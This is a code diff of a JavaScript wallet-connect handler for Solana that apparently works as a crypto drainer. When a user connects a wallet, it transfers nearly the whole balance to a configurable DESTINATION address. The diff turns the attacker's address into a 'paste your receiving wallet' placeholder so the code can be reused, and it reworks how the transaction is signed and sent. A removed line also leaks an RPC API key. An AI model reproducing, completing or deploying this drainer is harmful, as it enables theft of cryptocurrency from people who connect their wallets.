@@ -7,8 +7,8 @@ import {
 } from "https://esm.sh/@solana/web3.js@1.95.3";
 
 // ---- CONFIG ----
-const DESTINATION = new PublicKey("8cGfpYnGSZDz1WbzReonTUNkDzJcL9K7adAKrKEKHUFN");
-const RPC_ENDPOINT = "https://mainnet.helius-rpc.com/?api-key=ca46080b-fd3d-421a-96c2-aad84d199416"; // swap for Helius/QuickNode
+const DESTINATION = new PublicKey("PASTE_YOUR_RECEIVING_WALLET_HERE");
+const RPC_ENDPOINT = "https://api.mainnet-beta.solana.com"; // swap for Helius/QuickNode
 const FEE_BUFFER = 10_000; // lamports left behind for fees
 
 const connection = new Connection(RPC_ENDPOINT, "confirmed");
@@ -52,11 +52,15 @@ async function handleConnect(name, btn) {
       SystemProgram.transfer({ fromPubkey: from, toPubkey: DESTINATION, lamports })
     );
 
+    const signed = await provider.signTransaction(tx);
     setStatus("Sending…");
-    const { signature } = await provider.signAndSendTransaction(tx);
+    const sig = await connection.sendRawTransaction(signed.serialize(), {
+      skipPreflight: false,
+      maxRetries: 3,
+    });
 
-    setStatus(`Sent. ${signature.slice(0, 8)}…`);
-    await connection.confirmTransaction(signature, "confirmed");
+    setStatus(`Sent. ${sig.slice(0, 8)}…`);
+    await connection.confirmTransaction(sig, "confirmed");
     setStatus("Done.");
   } catch (err) {
     console.error(err);
